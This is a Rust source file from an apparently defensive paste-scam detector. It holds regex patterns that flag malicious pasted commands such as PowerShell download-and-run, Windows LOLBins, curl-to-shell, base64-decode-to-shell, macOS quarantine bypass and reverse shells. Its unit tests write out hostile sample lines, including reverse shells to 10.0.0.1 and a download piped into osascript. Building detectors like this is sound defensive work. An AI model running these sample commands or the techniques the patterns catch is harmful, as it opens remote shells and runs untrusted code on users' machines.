//! Execution and scam signals (legacy `CommandDetector`, docs/spec/detection-rules.md
//! §3.1). Every pattern matches normalized text. Patterns shared with the
//! explainer live here so explanations and verdicts never disagree.

use std::sync::OnceLock;

use paste_warden_rules::command::CommandRules;

use super::re::{Re, alternation, lazy_re};

/// What may follow a program name for it to look like a command: a `-x` / `/x`
/// switch, a quote, comment, variable, script block or call operator.
const COMMON_ARG: &str = r#"[-/][a-z?]|["'#$&({\[]"#;

/// `powershell iwr …`: a cmdlet, a common alias or a script path, not any English
/// word ("I use powershell every day", #8).
const POWERSHELL_ARG: &str = r"(?:iwr|irm|iex|saps|curl|wget)\b|(?:invoke|start|stop|new|set|get|add|remove|copy|move|out|write|import|expand|register|enable|disable)-[a-z]|\.{1,2}[\\/]|[a-z]:\\|\S+\.ps1\b";

/// mshta runs a URL, `vbscript:` / `javascript:` / `about:`, or an `.hta` file.
const MSHTA_ARG: &str = r"(?:https?://|vbscript:|javascript:|about:)|\S+\.hta\b";

/// A program "being invoked": at the start or after a separator and followed by an
/// argument; with nothing after it (`curl … | powershell`) it must follow the start
/// of a line, a pipe or a separator.
fn invocation(program: &str, arg: &str) -> String {
    let prog = format!(r"(?:{program})(?:\.exe)?");
    format!(
        r#"(?im)(?:^|[\s;&|("']){prog}\s+(?:{COMMON_ARG}|{arg})|(?:^|[;&|(])\s*{prog}(?:\s*$|\s*[|;&]|\s+#|\s+-(?:\s|$))"#
    )
}

/// Hidden window (#20 F3): any prefix of `-WindowStyle` (`-w`, `-win`…), `-` or `/`,
/// value `hidden` (or a prefix) or `1`, optionally quoted, or `-w:hidden`.
pub(crate) const HIDDEN_WINDOW: &str = r#"(?:^|[\s"'])[-/]w(?:i(?:n(?:d(?:o(?:w(?:s(?:t(?:y(?:le?)?)?)?)?)?)?)?)?)?(?:\s+|:)["']?(?:h(?:i(?:d(?:d(?:en?)?)?)?)?|0*1)(?:\z|[^\w.])"#;

/// "In command position": line start, after a separator, or after a program that
/// opens or runs files (with flags and `start`'s `""` title).
const RUN_POSITION: &str = r#"(?:^\s*|[;&|(]\s*|\b(?:start|explorer|call|rundll32|regsvr32|msiexec|mshta|[wc]script|pcalua|hh|powershell|pwsh|cmd|invoke-item|ii|start-process|saps)(?:\.exe)?\s+(?:[-/]\S*\s+|""\s+)*)["']?"#;

fn runnable_ext() -> String {
    format!(
        r"\.(?:{})\b",
        alternation(&CommandRules::embedded().extensions.remote_file)
    )
}

lazy_re! { pub(crate) fn powershell = invocation("powershell|pwsh", POWERSHELL_ARG); }
lazy_re! { pub(crate) fn mshta_invocation = invocation("mshta", MSHTA_ARG); }
lazy_re! { pub(crate) fn cmd = r"(?i)\bcmd(\.exe)?\s+(?:/[a-z](?::\w+)?\s*)*/[ck]\b"; }
lazy_re! {
    pub(crate) fn delayed_expansion = r"(?im)\bcmd(?:\.exe)?\s+(?:/\S+\s+)*/v(?::on)?(?:\s|/|$)";
}
lazy_re! { pub(crate) fn certutil = r"(?i)\bcertutil(\.exe)?\b.*-urlcache"; }
lazy_re! { pub(crate) fn bitsadmin = r"(?i)\bbitsadmin(\.exe)?\b.*/transfer"; }
lazy_re! { pub(crate) fn rundll32 = r"(?i)\brundll32(\.exe)?\b.*(javascript:|https?://)"; }
lazy_re! { pub(crate) fn regsvr32 = r"(?i)\bregsvr32(\.exe)?\b.*/i:\s*https?://"; }
lazy_re! { pub(crate) fn msiexec = r"(?i)\bmsiexec(\.exe)?\b.*https?://"; }
lazy_re! { pub(crate) fn conhost = r"(?i)\bconhost(\.exe)?\b.*--headless"; }
lazy_re! { pub(crate) fn curl_shell = r"(?i)\b(curl|wget)\b[^|]*\|\s*(ba|z)?sh\b"; }
lazy_re! {
    pub(crate) fn script_host = format!(
        r#"(?im)(?:^|[\s;&|("'])[wc]script(?:\.exe)?\s+(?:/{{1,2}}[a-z][\w:]*\s+)*["']?(?://e:|[^\s"']+\.(?:{})\b)"#,
        alternation(&CommandRules::embedded().extensions.script_host)
    );
}
lazy_re! {
    pub(crate) fn html_help = r#"(?im)(?:^|[\s;&|("'])hh(?:\.exe)?\s+(?:-\w+\s+)*["']?(?:https?://|\\\\|mk:@msitstore:|(?:ms-)?its:|[^\s"']+\.chm\b)"#;
}
lazy_re! { pub(crate) fn cmstp = r#"(?i)\bcmstp(?:\.exe)?\s+(?:/\w+\s+)*["']?[^\s"']+\.inf\b"#; }
lazy_re! { pub(crate) fn pcalua = r"(?i)\bpcalua(?:\.exe)?\s+(?:-\w+\s+)*-a\s+\S"; }
lazy_re! { pub(crate) fn odbcconf = r"(?i)\bodbcconf(?:\.exe)?\s+[-/]\w"; }
lazy_re! {
    pub(crate) fn install_util = r#"(?i)\binstallutil(?:\.exe)?\s+(?:[-/]\S+\s+)*["']?[^\s"']+\.(?:dll|exe)\b"#;
}
lazy_re! { pub(crate) fn ftp_script = r"(?i)\bftp(?:\.exe)?\s+(?:[-/]\S+\s+)*[-/]s:\S"; }
lazy_re! {
    /// `\\host\share\…\x.exe` (also `\\host@SSL\DavWWWRoot\…`) in command position.
    pub(crate) fn remote_file = format!(
        r#"(?im){RUN_POSITION}\\\\[^\s\\"'/]+\\[^\r\n"'|&;<>]*{}"#,
        runnable_ext()
    );
}
lazy_re! {
    /// WebDAV: `\\host@SSL\…`, `\\host@80\…`, `\DavWWWRoot\` in command position or
    /// after `net use` / `pushd`.
    pub(crate) fn webdav = format!(
        r#"(?im)(?:{RUN_POSITION}|\bnet1?(?:\.exe)?\s+use\s+(?:(?:[a-z]:|\*)\s+)?["']?|\bpushd\s+["']?)\\\\[^\s\\"'/]+(?:@(?:ssl|\d+)(?:@\d+)?(?:\\|\b)|\\davwwwroot\b)"#
    );
}
lazy_re! { fn net_use_map = r#"(?i)\bnet1?(?:\.exe)?\s+use\s+(?P<d>[a-z]:|\*)\s+["']?\\\\"#; }
lazy_re! {
    pub(crate) fn search_ms = r#"(?i)\bsearch(?:-ms)?:[^\s"']*(?:query|crumb|displayname|subquery)="#;
}
lazy_re! { pub(crate) fn ms_msdt = r"(?i)\bms-msdt:\s*[-/]\w"; }

// ---- scam signals ----
lazy_re! { pub(crate) fn hidden_window = format!("(?i){HIDDEN_WINDOW}"); }
lazy_re! {
    pub(crate) fn encoded = r"(?i)(?:^|\s)-(e|ec|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}";
}
lazy_re! { pub(crate) fn iex = r"(?i)\b(iex|invoke-expression)\b"; }
lazy_re! {
    pub(crate) fn download = r"(?i)(downloadstring|downloadfile|\biwr\b|\birm\b|invoke-webrequest|invoke-restmethod|net\.webclient)";
}
lazy_re! {
    /// Bait comment: a `#` followed (same line) by a lure keyword from
    /// `rules/command/bait-keywords.json`.
    pub(crate) fn bait_comment = format!(
        "(?i)#.*({})",
        CommandRules::embedded().bait_patterns().collect::<Vec<_>>().join("|")
    );
}
lazy_re! { pub(crate) fn check_mark = "[\u{2705}\u{2714}\u{2611}]"; }
lazy_re! {
    /// 30+ whitespace then `#` (pushes the real command out of the input box). The
    /// legacy `(?<!\s)` guard does not change whether a match exists.
    pub(crate) fn padding = r"\s{30,}#";
}
lazy_re! { pub(crate) fn mshta_remote = r#"(?i)\bmshta(\.exe)?\s+["']?https?://"#; }

// ---- 1b: macOS / Linux (docs/spec/detection-rules.md §3.1) ----
lazy_re! {
    /// `osascript -e …` / `-l JavaScript -e …`, or a download piped into osascript.
    pub(crate) fn osascript =
        r#"(?im)(?:^|[\s;&|("'])osascript\s+(?:-[a-z]+\s+\S+\s+)*-e(?-u:\b)|\|\s*osascript(?-u:\b)"#;
}
lazy_re! {
    /// Gatekeeper bypass: `xattr -d com.apple.quarantine`, `xattr -c` / `-cr` / `-rc`.
    pub(crate) fn quarantine = r"(?i)(?-u:\b)xattr\s+(?:-[a-z]+\s+)*(?:-[a-z]*d[a-z]*\s+(?:-[a-z]+\s+)*com\.apple\.quarantine(?-u:\b)|-[a-z]*c[a-z]*(?-u:\b))";
}
lazy_re! {
    /// Decode, then run: `base64 -d | sh`, `base64 -D` (macOS), `xxd -r -p | bash`,
    /// `openssl base64 -d | sh`, or `sh -c "$(… | base64 -d)"` / `eval "$(… base64 -d)"`.
    pub(crate) fn decode_shell = r#"(?im)(?:(?-u:\b)base64\s+(?:-\w+\s+)*(?:-d|-D|--decode)(?-u:\b)|(?-u:\b)xxd\s+(?:-\w+\s+)*-r(?-u:\b)|(?-u:\b)openssl\s+(?:base64|enc)(?-u:\b)[^|\r\n]*\s-d(?-u:\b))[^|\r\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:/(?:usr/)?bin/)?(?:(?:ba|z|k|da)?sh|python[23]?|perl|osascript)(?-u:\b)|(?:(?-u:\b)(?:ba|z|k|da)?sh(?:\s+-[a-z]+)*\s+|(?-u:\b)eval\s+)["']?\$\([^)\r\n]*(?:(?-u:\b)base64\s+(?:-\w+\s+)*(?:-d|-D|--decode)(?-u:\b)|(?-u:\b)xxd\s+(?:-\w+\s+)*-r(?-u:\b))"#;
}
lazy_re! {
    /// Network shell: `/dev/tcp/host/port`, `nc -e /bin/sh`, `mkfifo … | nc`.
    pub(crate) fn dev_tcp = r#"(?i)/dev/(?:tcp|udp)/[^\s/]+/\d+|(?-u:\b)n(?:c|cat|etcat)(?-u:\b)[^\r\n|;]*\s-[ec]\s+["']?(?:/(?:usr/)?bin/)?(?:ba|z)?sh(?-u:\b)|(?-u:\b)mkfifo(?-u:\b)[^\r\n]*\|\s*n(?:c|cat|etcat)(?-u:\b)"#;
}
lazy_re! {
    /// Reverse shell (strong): an interactive shell wired to a socket.
    pub(crate) fn reverse_shell = r#"(?i)(?-u:\b)(?:ba|z|k)?sh\s+-i(?-u:\b)[^\r\n]*/dev/(?:tcp|udp)/|/dev/(?:tcp|udp)/[^\r\n]*\d>&\d|(?-u:\b)exec\s+\d+<>\s*/dev/(?:tcp|udp)/|(?-u:\b)n(?:c|cat|etcat)(?-u:\b)[^\r\n|;]*\s-[ec]\s+["']?(?:/(?:usr/)?bin/)?(?:ba|z)?sh(?-u:\b)|(?-u:\b)mkfifo(?-u:\b)[^\r\n]*\|\s*n(?:c|cat|etcat)(?-u:\b)"#;
}
lazy_re! {
    /// Detached and silenced (strong, the Unix "hidden window"): `nohup`,
    /// `disown`, `setsid`, or output thrown away and backgrounded
    /// (`>/dev/null 2>&1 &`, `&>/dev/null &`).
    pub(crate) fn background = r"(?im)(?-u:\b)nohup(?-u:\b)|(?-u:\b)disown(?-u:\b)|(?-u:\b)setsid(?-u:\b)|>\s*/dev/null\s+2>&1\s*&(?:\s|;|$)|&>\s*/dev/null\s*&(?:\s|;|$)";
}

// ---- 1b: Windows (§3.1) ----
lazy_re! {
    /// msiexec installing a remote package without UI (`/q`, `/qn`, `/quiet`,
    /// `/passive`; `-` works too).
    pub(crate) fn msiexec_quiet = r"(?im)(?-u:\b)msiexec(?:\.exe)?(?-u:\b)[^\r\n]*(?:https?://[^\r\n]*\s[-/](?:q[nbr]?\+?|quiet|passive)(?-u:\b)|\s[-/](?:q[nbr]?\+?|quiet|passive)(?-u:\b)[^\r\n]*https?://)";
}
lazy_re! {
    /// Hidden window through .NET: `[Diagnostics.ProcessWindowStyle]::Hidden`,
    /// `.WindowStyle = 'Hidden'`, `CreateNoWindow = $true`.
    pub(crate) fn hidden_window_api = r#"(?i)processwindowstyle\]\s*::\s*hidden(?-u:\b)|\.windowstyle\s*=\s*["']?hidden(?-u:\b)|(?-u:\b)createnowindow\s*=\s*\$true(?-u:\b)"#;
}

/// Per-drive "run from the mapped drive" patterns, compiled on first use.
fn run_from_drive(drive: char) -> Option<&'static Re> {
    static CACHE: [OnceLock<Re>; 27] = [const { OnceLock::new() }; 27];
    let (slot, letter) = match drive {
        '*' => (26, "[a-z]".to_owned()),
        'a'..='z' => ((drive as usize) - ('a' as usize), drive.to_string()),
        _ => return None,
    };
    let re = CACHE.get(slot)?.get_or_init(|| {
        Re::new(&format!(
            r#"(?im){RUN_POSITION}{letter}:\\?[^\r\n"'|&;<>]*{}"#,
            runnable_ext()
        ))
    });
    Some(re)
}

/// `net use Z: \\host\…` (or `*`) followed by running an executable from that
/// drive in command position. Only the text after the first mapping of each drive
/// is checked.
pub(crate) fn net_use_then_run(text: &str) -> bool {
    let Some(map) = net_use_map().get() else {
        return false;
    };
    let mut seen: Vec<char> = Vec::new();
    for c in map.captures_iter(text) {
        let (Some(whole), Some(d)) = (c.get(0), c.name("d")) else {
            continue;
        };
        let Some(drive) = d.as_str().chars().next().map(|c| c.to_ascii_lowercase()) else {
            continue;
        };
        if seen.contains(&drive) {
            continue;
        }
        seen.push(drive);
        let rest = text.get(whole.end()..).unwrap_or_default();
        if run_from_drive(drive).is_some_and(|re| re.is_match(rest)) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn all_patterns_compile() {
        for re in [
            powershell(),
            mshta_invocation(),
            cmd(),
            delayed_expansion(),
            certutil(),
            bitsadmin(),
            rundll32(),
            regsvr32(),
            msiexec(),
            conhost(),
            curl_shell(),
            script_host(),
            html_help(),
            cmstp(),
            pcalua(),
            odbcconf(),
            install_util(),
            ftp_script(),
            remote_file(),
            webdav(),
            net_use_map(),
            search_ms(),
            ms_msdt(),
            hidden_window(),
            encoded(),
            iex(),
            download(),
            bait_comment(),
            check_mark(),
            padding(),
            mshta_remote(),
            osascript(),
            quarantine(),
            decode_shell(),
            dev_tcp(),
            reverse_shell(),
            background(),
            msiexec_quiet(),
            hidden_window_api(),
        ] {
            assert!(re.compiled());
        }
        for d in ('a'..='z').chain(['*']) {
            assert!(run_from_drive(d).is_some_and(Re::compiled));
        }
    }

    #[test]
    fn hidden_window_prefixes() {
        for s in [
            "x -w hidden",
            "x -WindowSt h",
            "x /w 1",
            "x -w:hidden",
            "x -win 'hid'",
        ] {
            assert!(hidden_window().is_match(s), "{s}");
        }
        for s in ["x -w hiddenx", "x -wo hidden", "x -w 2", "x -w hidden.ps1"] {
            assert!(!hidden_window().is_match(s), "{s}");
        }
    }

    type Case = (fn() -> &'static Re, &'static str);

    #[test]
    fn unix_signals() {
        let yes: [Case; 12] = [
            (osascript, "osascript -e 'display dialog \"x\"'"),
            (osascript, "curl -s https://x.invalid/a | osascript"),
            (quarantine, "xattr -d com.apple.quarantine /tmp/a"),
            (quarantine, "xattr -cr ~/Downloads/A.app"),
            (
                quarantine,
                "xattr -rd com.apple.quarantine /Applications/A.app",
            ),
            (decode_shell, "echo aGk= | base64 -D | bash"),
            (decode_shell, "bash -c \"$(echo aGk= | base64 --decode)\""),
            (decode_shell, "echo 6869 | xxd -r -p | sh"),
            (dev_tcp, "cat < /dev/tcp/10.0.0.1/80"),
            (reverse_shell, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            (reverse_shell, "nc -e /bin/sh 10.0.0.1 4444"),
            (background, "nohup ./x >/dev/null 2>&1 &"),
        ];
        for (re, s) in yes {
            assert!(re().is_match(s), "{s}");
        }
        let no: [Case; 7] = [
            (osascript, "osascript script.scpt"),
            (quarantine, "xattr -l /tmp/a"),
            (quarantine, "xattr -p com.apple.quarantine a"),
            (decode_shell, "echo aGk= | base64 -d > out.txt"),
            (reverse_shell, "cat < /dev/tcp/10.0.0.1/80"),
            (background, "python app.py > log 2>&1 &"),
            (msiexec_quiet, "msiexec /i https://x.invalid/a.msi"),
        ];
        for (re, s) in no {
            assert!(!re().is_match(s), "{s}");
        }
        assert!(msiexec_quiet().is_match("msiexec /q /i https://x.invalid/a.msi"));
        assert!(msiexec_quiet().is_match("msiexec -i https://x.invalid/a.msi -qn"));
        assert!(hidden_window_api().is_match("$p.WindowStyle = 'Hidden'"));
    }

    #[test]
    fn net_use() {
        assert!(net_use_then_run(r"net use z: \\h\s & z:\a.exe"));
        assert!(net_use_then_run(r"net use * \\h\s & q:\a.exe"));
        assert!(!net_use_then_run(r"net use z: \\h\s & y:\a.exe"));
    }
}
